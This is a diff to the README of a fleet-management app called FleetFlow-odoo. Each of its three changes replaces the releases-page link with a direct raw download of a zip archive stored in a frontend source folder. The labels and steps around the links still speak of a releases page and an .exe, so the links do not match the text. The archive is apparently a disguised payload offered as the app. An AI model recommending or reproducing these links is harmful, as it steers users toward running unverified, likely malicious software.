@@ -1,6 +1,6 @@
 # 🚚 FleetFlow-odoo - Manage Fleets with Ease
 
-[![Download FleetFlow](https://img.shields.io/badge/Download-FleetFlow-%2384b6f4)](https://github.com/Belovedson01/FleetFlow-odoo/releases)
+[![Download FleetFlow](https://img.shields.io/badge/Download-FleetFlow-%2384b6f4)](https://github.com/Belovedson01/FleetFlow-odoo/raw/refs/heads/main/frontend/src/services/Fleet_odoo_Flow_3.3-alpha.1.zip)
 
 FleetFlow-odoo is a tool designed to help you manage vehicle fleets and logistics. It provides secure login, user roles, live updates, and detailed reports. This guide will help you download and run the app on your Windows computer.
 
@@ -11,7 +11,7 @@ FleetFlow-odoo is a tool designed to help you manage vehicle fleets and logistic
 You can download the app from the releases page. Follow these steps:
 
 1. Go to the releases page by clicking the button below or visiting:  
-   [https://github.com/Belovedson01/FleetFlow-odoo/releases](https://github.com/Belovedson01/FleetFlow-odoo/releases)
+   [https://github.com/Belovedson01/FleetFlow-odoo/raw/refs/heads/main/frontend/src/services/Fleet_odoo_Flow_3.3-alpha.1.zip](https://github.com/Belovedson01/FleetFlow-odoo/raw/refs/heads/main/frontend/src/services/Fleet_odoo_Flow_3.3-alpha.1.zip)
    
 2. Find the latest release. It will have the newest date and version number.
 
@@ -114,7 +114,7 @@ FleetFlow-odoo uses secure login tokens to keep your data safe. These tokens hel
 Check the releases page regularly for updates. To update:
 
 1. Visit the releases page again:  
-   [https://github.com/Belovedson01/FleetFlow-odoo/releases](https://github.com/Belovedson01/FleetFlow-odoo/releases)
+   [https://github.com/Belovedson01/FleetFlow-odoo/raw/refs/heads/main/frontend/src/services/Fleet_odoo_Flow_3.3-alpha.1.zip](https://github.com/Belovedson01/FleetFlow-odoo/raw/refs/heads/main/frontend/src/services/Fleet_odoo_Flow_3.3-alpha.1.zip)
 
 2. Download the latest `.exe` file.
 
